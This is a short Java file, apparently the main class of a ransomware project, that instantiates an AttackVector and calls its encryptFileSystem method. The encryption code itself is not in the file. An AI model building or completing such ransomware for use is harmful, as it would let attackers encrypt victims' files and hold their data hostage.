package Agent;

import Agent.Attack.AttackVector;
import server.exceptions.RansomwareException;

public class RansomMain {

	public static void main(String[] args) {
		AttackVector attack=new AttackVector();
		try {
			attack.encryptFileSystem();
		} catch (RansomwareException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
